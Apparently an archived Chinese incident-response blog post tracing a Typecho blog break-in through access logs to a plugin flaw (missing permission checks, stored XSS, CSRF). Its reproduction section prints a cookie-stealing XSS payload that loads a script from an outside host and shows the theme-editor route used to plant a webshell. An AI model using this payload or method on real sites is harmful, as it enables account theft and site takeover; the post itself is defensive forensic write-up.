---
layout: post
title: 分析、还原一次typecho入侵事件
categories:
- Pocket
tags:
---
原文地址：http://mp.weixin.qq.com/s/Qi7uGimlIbVALZSnQks72Q

收藏时间：2018-03-30 22:58:16

<div  lang="zh"><div id="img-content" nodeIndex="5"><p class="profile_meta _RIL_KEEPER_CLASS_" nodeIndex="10">
                            <label class="profile_meta_label">微信号</label>
                            <span class="profile_meta_value">xazlsec</span>
                            </p><p class="profile_meta _RIL_KEEPER_CLASS_" nodeIndex="11">
                            <label class="profile_meta_label">功能介绍</label>
                            <span class="profile_meta_value">信安之路是一个学习分享信息安全技术的平台，在这里你可以学习别人的技术和心得，你也可以分享自己的学习成果和心得体会，这是一个有温度的平台，需要你我他的共同参与，一起发扬广大，成为安全圈的一方净土，目前也是 90sec 安全论坛的战略合作伙伴。</span>
                            </p><div class="rich_media_content " id="js_content" nodeIndex="12"><blockquote nodeIndex="13"><p class=" _RIL_KEEPER_CLASS_" nodeIndex="14">本文作者：Lz1y</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="15">赠送书籍：《Web安全深度剖析》</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="16">活动地址：<a href="http://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&mid=2247486791&idx=1&sn=1cde67bceaff09218fb9acb297550400&chksm=ec1e3d6fdb69b479f9ec58765eade141518ee73cc29731bbe07b8f75f9cfe515af40d479685d&scene=21#wechat_redirect" nodeIndex="104">阳春三月免费赠书啦</a></p></blockquote><p class=" _RIL_KEEPER_CLASS_" nodeIndex="17">基友 <code nodeIndex="105">szrzvdny</code> 的朋友博客被入侵了,由于是虚拟空间,所以只有 apache 访问日志以供分析</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="18">这里的日志已经做去敏操作了，以供学习:</p><blockquote nodeIndex="19"><p class=" _RIL_KEEPER_CLASS_" nodeIndex="20">https://pan.baidu.com/s/1JUII7_ZOK1SIxnWxlzu0Hw 密码: bykr</p></blockquote><p class=" _RIL_KEEPER_CLASS_" nodeIndex="21">整个事情发生的挺突然的，我也是第一次搞这种溯源、应急响应的东西~一想到说不定就拿到了 <code nodeIndex="106">typecho</code> 的 0day，其实还是很激动的。</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="22">首先分析日志，Linux 可以用 grep</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="23">我：Windows、Notepad++</p><h3 nodeIndex="24">首先直接查找木马文件</h3><p class=" _RIL_KEEPER_CLASS_" nodeIndex="25">首先搜一搜常用的恶意函数，例如 Eval、assert、phpinfo()、pwd 等等</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="26"><div id="RIL_IMG_1" class="RIL_IMG"><img src="/media/posts_images/2018-03-30-2133962296/1"/></div></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="27">搜索 PHPINFO() 的时候，找到了大量的 404 页面访问记录</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="28">最后通过分析，得到了一句话木马地址为 <code nodeIndex="107">/1.php</code> 以及 <code nodeIndex="108">/1_1.php</code></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="29">由于 Apache 的 log 默认不记录 post 数据，这些文件像是凭空出现一般，接下来我们通过 IP 来反查!</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="30">通过访问一句话木马的频率，得到了以下可疑 IP:</p><blockquote nodeIndex="31"><p class=" _RIL_KEEPER_CLASS_" nodeIndex="32">223.104.170.145</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="33">103.250.73.27</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="34">112.120.33.163</p></blockquote><p class=" _RIL_KEEPER_CLASS_" nodeIndex="35">根据访问时间，以及访问动作，锁定 <code nodeIndex="109">112.120.33.163</code> 为攻击者 IP</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="36"><div id="RIL_IMG_2" class="RIL_IMG"><img src="/media/posts_images/2018-03-30-2133962296/2"/></div></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="37">可以看到嫌疑人通过两天的踩点,在 3 月 16 日访问了 <code nodeIndex="110">/index.php/action/links-edit</code> 后，3 月 18 日入侵进了后台。</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="38">可能你跟我想的一样，对没错，这就是通过 XSS 入侵的一次安全事件</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="39">github 看了源码之后发现，源程序并无 <code nodeIndex="111">action/links-edit</code> 这些函数方法</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="40">而这一切的问题都出在一款插件上: `typecho-links</p><blockquote nodeIndex="41"><p class=" _RIL_KEEPER_CLASS_" nodeIndex="42">https://www.boke8.net/typecho-links-plugin.html</p></blockquote><p class=" _RIL_KEEPER_CLASS_" nodeIndex="43">该插件是一款管理友情链接的拓展</p><h3 nodeIndex="44">分析一波源码</h3><p class=" _RIL_KEEPER_CLASS_" nodeIndex="45">主要的漏洞利用链:</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="46">垂直越权（前台添加 links）— XSS（ links 未过滤，直接入库）— CSRF （直接以管理员权限执行某些操作）</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="47">简单分析下源码~</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="48">越权，未验证用户权限</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="49"><div id="RIL_IMG_3" class="RIL_IMG"><img src="/media/posts_images/2018-03-30-2133962296/3"/></div></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="50">XSS，未过滤标签</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="51"><div id="RIL_IMG_4" class="RIL_IMG"><img src="/media/posts_images/2018-03-30-2133962296/4"/></div></p><h3 nodeIndex="52">本地复现：</h3><p class=" _RIL_KEEPER_CLASS_" nodeIndex="53">搭建好博客，然后添加插件，退出登录</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="54">POST URL,虽然并未登陆，但是显示 Link 已经添加</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="55"><div id="RIL_IMG_5" class="RIL_IMG"><img src="/media/posts_images/2018-03-30-2133962296/5"/></div></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="56"><div id="RIL_IMG_6" class="RIL_IMG"><img src="/media/posts_images/2018-03-30-2133962296/6"/></div></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="57">确实添加成功了。</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="58">接下来插入 <code nodeIndex="112">xss payload</code>:</p><blockquote nodeIndex="59"><p class=" _RIL_KEEPER_CLASS_" nodeIndex="60"><code nodeIndex="113">name=<script src='http://1.1.1.1/xss.js'></script>&url=http%3A%2F%2Faaaaa&sort=aaa&image=&description=aaa&user=&do=insert&lid=</code></p></blockquote><p class=" _RIL_KEEPER_CLASS_" nodeIndex="61"><code nodeIndex="114">xss.js</code> 通过引入 JQuery 以及调用 Ajax 方法，传递 cookie</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="62"><div id="RIL_IMG_7" class="RIL_IMG"><img src="/media/posts_images/2018-03-30-2133962296/7"/></div></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="63">得到了 cookie,进入后台后</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="64">通过:</p><blockquote nodeIndex="65"><p class=" _RIL_KEEPER_CLASS_" nodeIndex="66"><code nodeIndex="115">/admin/theme-editor.php?theme=default&file=404.php</code></p></blockquote><p class=" _RIL_KEEPER_CLASS_" nodeIndex="67"><div id="RIL_IMG_8" class="RIL_IMG"><img src="/media/posts_images/2018-03-30-2133962296/8"/></div></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="68">然后访问不存在的页面，触发包含 <code nodeIndex="116">404.php</code> 就可以了~</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="69"><div id="RIL_IMG_9" class="RIL_IMG"><img src="/media/posts_images/2018-03-30-2133962296/9"/></div></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="70"><br nodeIndex="117"></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="71">写的十分粗糙，旨在记录一下第一次分析日志的经历~</p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="72"><div id="RIL_IMG_10" class="RIL_IMG"><img src="/media/posts_images/2018-03-30-2133962296/10"/></div></p><p class=" _RIL_KEEPER_CLASS_" nodeIndex="73"><div id="RIL_IMG_11" class="RIL_IMG"><img src="/media/posts_images/2018-03-30-2133962296/11"/></div></p>
                </div>
                <div class="ct_mpda_wrp" id="js_sponsor_ad_area" nodeIndex="74"></div>

                
                                <p class=" _RIL_KEEPER_CLASS_" nodeIndex="78">
                        
                        <a class="reward_access" id="js_reward_link" href=""><span class="icon-reward"></span><span id="js_reward_link_text">赞赏</span></a>
                        
                    </p><p class="tips_global reward_user_tips _RIL_KEEPER_CLASS_" id="js_reward_total_parent" nodeIndex="80"><a href="" id="js_reward_total"></a>人赞赏</p>
                                <p class="tips_global _RIL_KEEPER_CLASS_" nodeIndex="84">长按二维码向我转账</p><p class="reward_tips _RIL_KEEPER_CLASS_" nodeIndex="85"></p><p class="tips_global _RIL_KEEPER_CLASS_" nodeIndex="86">受苹果公司新规定影响，微信 iOS 版的赞赏功能被关闭，可通过二维码转账支持公众号。</p>
                                            </div>
                        
                        


                    </div>